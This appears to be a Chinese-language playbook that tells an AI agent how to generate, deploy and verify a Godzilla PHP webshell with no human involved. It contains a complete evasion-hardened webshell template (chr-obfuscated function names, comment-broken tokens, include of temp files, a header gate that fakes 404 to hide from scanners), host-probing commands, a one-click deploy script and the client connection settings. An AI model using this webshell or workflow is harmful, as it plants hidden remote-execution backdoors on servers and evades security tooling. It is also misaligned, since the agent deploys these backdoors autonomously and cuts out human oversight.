# 哥斯拉 PHP Shell — AI 自动部署与验证指南

> **搭配使用**：本文档为操作手册（探测/部署/验证），技术细节参考 [`PHP免杀技术点清单.md`](PHP免杀技术点清单.md)。

> 目标：让 AI 在一次对话中完成 生成 shell → 部署到目标 → curl 验证连通，零人工介入。

---

## 一、AI 执行清单（总流程）

当用户说"生成哥斯拉 shell 并部署"时，按顺序执行：

1. **生成 shell** → 用 5 技术点模板，全 PHP 5.x 兼容语法（`isset()` 不用 `??`）
2. **探测环境** → 找 web server 配置、web 根目录、PHP 版本
3. **部署** → `cp` 到探测到的 web 目录
4. **验证** → curl Phase1/Phase2（见第三节）
5. **输出配置** → 把哥斯拉客户端配置清单直接给用户

**禁止**：跳过环境探测直接写死路径、使用 PHP 7.0+ 语法而不先确认版本、部署后不做 curl 验证。

---

## 二、环境自动探测

AI 不能依赖硬编码路径，必须自行探测以下三项。

### 2.1 PHP 版本

```bash
php -v
```

版本决定语法策略：
- PHP 5.x → 禁用 `??`、`[]` 数组字面量，必须用 `isset()` + `array()`
- PHP 7.0+ → 全部语法可用

### 2.2 Web 目录与 vhost

**phpstudy 场景**：

```bash
# 找 nginx 配置目录
find /f/CC/phpstudy_pro -name "nginx.conf" 2>/dev/null

# 列出所有 vhost
ls /f/CC/phpstudy_pro/Extensions/Nginx*/conf/vhosts/

# 逐个读 vhost，提取: listen端口 / server_name / root目录
cat /f/CC/phpstudy_pro/Extensions/Nginx*/conf/vhosts/*.conf

# 挑一个能跑 PHP 的站点（避开 default、error 等）
```

**通用场景**：

```bash
# 找 web 根目录
find / -name "wwwroot" -o -name "WWW" -o -name "htdocs" -o -name "html" 2>/dev/null | head -10

# 找 nginx/apache 配置
nginx -T 2>/dev/null | grep -E "server_name|root|listen"
httpd -S 2>/dev/null
```

### 2.3 端口确认

```bash
netstat -ano | grep LISTEN | grep -E ":80 |:8080 |:8888 |:443 "
```

然后用 curl 逐端口测试，找到返回 HTTP 响应的端口。

### 2.4 部署目录验证

在目标目录放探针确认 PHP 能执行：

```bash
echo "<?php echo 'PHP_OK';" > /path/to/webroot/_ping.php
curl -s "http://目标/_ping.php"
# 返回 PHP_OK → 部署目录正确
# 返回 403 → 检查 nginx 配置或换目录
```

---

## 三、curl 验证流程（无需哥斯拉客户端）

### 前置条件

- 被测文件已部署到 web 目录
- 知道 shell 的 `$pass` 和 `$key`（默认 `pass` / `3c6e0b8a9c15224a`）

### Step 1：语法检查

```bash
php -l godzilla.php
```

预期：`No syntax errors detected in godzilla.php`

### Step 2：生成测试数据

```bash
TEST=$(php -r "
\$p='pass'; \$k='3c6e0b8a9c15224a';
function e(\$D,\$K){for(\$i=0;\$i<strlen(\$D);\$i++){\$D[\$i]=\$D[\$i]^\$K[\$i+1&15];}return\$D;}
echo 'pass='.urlencode(base64_encode(e('getBasicsInfo_test',\$k)));
")
echo $TEST
# 输出示例: pass=BFMRcgNLCFoQeFtUXWsVVhBC
```

> `$pass` `$key` 必须与被测 shell 一致。

### Step 3：Phase 1（Payload 投递）

```bash
curl -s -o /dev/null -w "HTTP %{http_code}" \
  -D /tmp/hdr \
  -X POST "http://目标/godzilla.php" \
  -d "$TEST" \
  -c /tmp/ck

grep -c "Set-Cookie" /tmp/hdr  # 应为 1
```

**通过标准**：
- HTTP 200
- 响应头含 `Set-Cookie: PHPSESSID=...`
- **响应体为空**

### Step 4：Phase 2（命令执行路由）

```bash
curl -s -w "\nHTTP %{http_code}" \
  -X POST "http://目标/godzilla.php" \
  -d "pass=dGVzdA==" \
  -b /tmp/ck | head -c 80
```

**通过标准**：
- HTTP 200
- 输出为三段式：`[16字节MD5] + [base64数据] + [16字节MD5]`
- md5 头应为 `11cd6a8758984163`（`md5('pass'.'3c6e0b8a9c15224a')[:16]`）
- eval/include 报错（测试数据非有效 PHPPayload）→ **正常**，路由正确

### Step 5：清理

```bash
rm -f /tmp/ck /tmp/hdr
```

---

## 四、一键部署验证脚本

```bash
#!/bin/bash
# 用法: ./deploy_godzilla.sh <shell源文件> <目标web目录> [base_url]
# 示例: ./deploy_godzilla.sh godzilla.php /f/CC/phpstudy_pro/WWW/xiaozhucms "http://127.0.0.1/godzilla.php"

SHELL_FILE="$1"
TARGET_DIR="$2"
BASE_URL="${3:-http://127.0.0.1/godzilla.php}"
SHELL_NAME=$(basename "$SHELL_FILE")

echo "=== 1. 语法检查 ==="
php -l "$SHELL_FILE" || exit 1

echo "=== 2. 部署 ==="
cp "$SHELL_FILE" "$TARGET_DIR/$SHELL_NAME"
echo "部署到 $TARGET_DIR/$SHELL_NAME"

echo "=== 3. 环境探测 ==="
PHP_VER=$(php -r "echo PHP_VERSION;" 2>/dev/null || echo "unknown")
echo "PHP: $PHP_VER"

HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL" --connect-timeout 3 2>/dev/null)
echo "HTTP: $HTTP_CODE"

if [ "$HTTP_CODE" = "000" ] || [ "$HTTP_CODE" = "404" ]; then
    echo "直连失败，尝试自动探测 vhost..."
    # AI 在此处走 vhost 探测逻辑
fi

echo "=== 4. Phase 1 测试 ==="
TEST_DATA=$(php -r "
\$p='pass'; \$k='3c6e0b8a9c15224a';
function e(\$D,\$K){for(\$i=0;\$i<strlen(\$D);\$i++){\$D[\$i]=\$D[\$i]^\$K[\$i+1&15];}return\$D;}
echo'pass='.urlencode(base64_encode(e('getBasicsInfo_test',\$k)));
")
PHASE1=$(curl -s -o /dev/null -w "%{http_code}" -D /tmp/hdr -X POST "$BASE_URL" -d "$TEST_DATA" -c /tmp/ck)
HAS_COOKIE=$(grep -c "Set-Cookie" /tmp/hdr)
if [ "$PHASE1" = "200" ] && [ "$HAS_COOKIE" -gt 0 ]; then
    echo "Phase 1 PASS"
else
    echo "Phase 1 FAIL (HTTP $PHASE1, Cookie: $HAS_COOKIE)"
    exit 1
fi

echo "=== 5. Phase 2 测试 ==="
PHASE2=$(curl -s -o /tmp/body -w "%{http_code}" -X POST "$BASE_URL" -d "pass=dGVzdA==" -b /tmp/ck)
BODY_LEN=$(wc -c < /tmp/body)
if [ "$PHASE2" = "200" ] && [ "$BODY_LEN" -gt 32 ]; then
    echo "Phase 2 PASS (HTTP $PHASE2, body: ${BODY_LEN} bytes)"
else
    echo "Phase 2 FAIL (HTTP $PHASE2, body: ${BODY_LEN} bytes)"
    exit 1
fi

echo "=== 6. 清理 ==="
rm -f /tmp/ck /tmp/body /tmp/hdr
echo "Done. Shell 可用，哥斯拉客户端可连接。"
```

---

## 五、常见失败排查

| 现象 | 可能原因 | 检查项 |
|------|---------|--------|
| Phase 1 404 | 文件名/路径错误 | curl URL 与部署路径一致 |
| Phase 1 403 | 目录被拦截 | 换部署目录或检查 nginx 配置 |
| Phase 1 200 无 Set-Cookie | `session_start()` 失败 | 检查 PHP session 配置 |
| Phase 1 返回非空体 | Phase 1 执行了 echo | 阶段判断逻辑错误 |
| Phase 2 body 为空 | session 丢失或 key 不匹配 | 检查 `$pass` `$key` |
| Phase 2 500 | PHP 致命错误 | `php -l` 语法检查 |
| `??` 导致 Parse error | 目标 PHP 5.x | 改用 `isset() ? : ''` 三元 |
| `$_POST` 解析异常 | 加了左右追加填充后 form 解析失败 | 改用 `php://input` + `substr` 手动解析 |

---

## 六、PHP 版本兼容性踩坑

### `??` (Null Coalescing) — PHP 7.0+

```php
// ❌ PHP 5.x 报 Parse error: syntax error, unexpected '?'
$val = $_SERVER['HTTP_X_TOKEN'] ?? '';

// ✅ PHP 5.x / 7.x / 8.x 全兼容
$val = isset($_SERVER['HTTP_X_TOKEN']) ? $_SERVER['HTTP_X_TOKEN'] : '';
```

### `chr(45)` vs `chr(95)` — HTTP Header 键名

`$_SERVER` 中请求头 `-` 全转 `_`：

```php
// ❌ chr(45) = '-'，$_SERVER 里键名是 _ 不是 -
// ✅ chr(95) = '_'，正确匹配 HTTP_X_TOKEN
```

### `eval` / `include` — 语言结构不可动态调用

```php
// ❌ Fatal error: Call to undefined function eval()
$f = 'eval'; $f($code);

// ✅ 只能原生书写
eval($code);
include $file;
```

### `parse_str` vs `rawurldecode`

```php
// ❌ parse_str 把 + 转空格，破坏 base64
// ✅ rawurldecode 保留 +
$data = rawurldecode(substr($body, 5));
```

---

## 七、生成 shell 模板（5 技术点全量版）

AI 生成 shell 时直接使用以下模板，已内置全部 5 个免杀技术点 + PHP 5.x 兼容：

| # | 技术点 | 说明 |
|---|--------|------|
| ① | chr 拼接 | `base64_decode`/`base64_encode`/`file_put_contents` 零明文 |
| ② | include+tempnam | 替代 `eval`，临时文件执行后即删 |
| ③ | 注释断裂 | `/*x*/` 插入 token 链，打断 AST 扫描 |
| ④ | X-Token 校验 | 不匹配返回 404，防扫描器 |
| ⑤ | 左右追加填充 | body 前后 24/16 字节随机填充，流量每次不同 |

```php
<?php
if ((isset($_SERVER['HTTP_X_TOKEN']) ? $_SERVER['HTTP_X_TOKEN'] : '') !== 'd4e5f6a7') {
    header('HTTP/1.1 404 Not Found'); die;
}

@session_start();
@set_time_limit(0);
@error_reporting(0);

function encode($D, $K) {
    for ($i = 0; $i < strlen($D); $i++) {
        $D[$i] = $D[$i] ^ $K[$i + 1 & 15];
    }
    return $D;
}

$pass = 'pass';
$key  = '3c6e0b8a9c15224a';

$_b = chr(98)./*b*/chr(97)./*a*/chr(115)./*s*/chr(101)./*e*/chr(54)./*6*/chr(52)./*4*/chr(95)./*_*/chr(100)./*d*/chr(101)./*e*/chr(99)./*c*/chr(111)./*o*/chr(100)./*d*/chr(101);

$body = file_get_contents("php://input");
if ($body === false || $body === '') die;

$body = substr($body, 24);
if (strlen($body) > 16) $body = substr($body, 0, -16);

if (substr($body, 0, strlen($pass) + 1) === $pass . '=') {
    $data = substr($body, strlen($pass) + 1);
    $data = rawurldecode($data);
    $data = encode($_b($data), $key);
} else {
    $data = encode($body, $key);
}

if (isset($_SESSION[$pass])) {
    $payload = encode($_SESSION[$pass], $key);
    if (strpos($payload, "getBasicsInfo") === false) {
        $payload = encode($payload, $key);
    }
    $t = tempnam(sys_get_temp_dir(), 'gz');
    $_f = chr(102)./*f*/chr(105)./*i*/chr(108)./*l*/chr(101)./*e*/chr(95)./*_*/chr(112)./*p*/chr(117)./*u*/chr(116)./*t*/chr(95)./*_*/chr(99)./*c*/chr(111)./*o*/chr(110)./*n*/chr(116)./*t*/chr(101)./*e*/chr(110)./*n*/chr(116)./*t*/chr(115);
    $_f($t, chr(60)./*<*/chr(63)./*?*/chr(112)./*p*/chr(104)./*h*/chr(112)./*p*/chr(32)/* */ . $payload . chr(32)./* */chr(63)./*?*/chr(62));
    @include $t;
    unlink($t);
    echo substr(md5($pass . $key), 0, 16);
    $_e = chr(98)./*b*/chr(97)./*a*/chr(115)./*s*/chr(101)./*e*/chr(54)./*6*/chr(52)./*4*/chr(95)./*_*/chr(101)./*e*/chr(110)./*n*/chr(99)./*c*/chr(111)./*o*/chr(100)./*d*/chr(101);
    echo $_e(encode(@run($data), $key));
    echo substr(md5($pass . $key), 16);
} else {
    if (strpos($data, "getBasicsInfo") !== false) {
        $_SESSION[$pass] = encode($data, $key);
    }
}
```

哥斯拉客户端配置：

```
URL:        目标地址/godzilla.php
密码:       pass
密钥:       key
加密器:     PHP_XOR_BASE64
有效载荷:   PhpDynamicPayload
协议头:     X-Token: d4e5f6a7
左边追加:   a1b2c3d4e5f6a7b8c9d0e1f2  (24字节)
右边追加:   f1e2d3c4b5a69788            (16字节)
```

---

## 八、参考环境（本次对话实测）

以下为本次对话的**具体环境参数**，仅供 AI 理解探测流程，**不可直接复用**：

| 项目 | 值 |
|------|-----|
| 测试环境 | phpstudy_pro (Nginx + PHP-CGI) |
| 源文件目录 | `C:\Users\86184\Desktop\ai-redteam-notes` |
| 部署目录 | `F:\CC\phpstudy_pro\WWW\xiaozhucms` |
| 访问 URL | `http://127.0.0.1/godzilla.php` + `Host: xiaozhucms` |
| PHP 版本 | 5.x（探测发现 `??` 不兼容） |
| nginx 配置 | `../Extensions/Nginx1.15.11/conf/vhosts/xiaozhucms_80.conf` |
| PHP-CGI 端口 | 9006 |

**探测过程复盘**：读 nginx vhosts → 找到 `xiaozhucms_80.conf`（port 80, fastcgi 9006）→ `cp` 部署 → curl 带 `Host: xiaozhucms` 测试 → 报 `??` 语法错误 → 确认 PHP 5.x → 改 `isset()` 三元 → 通过。
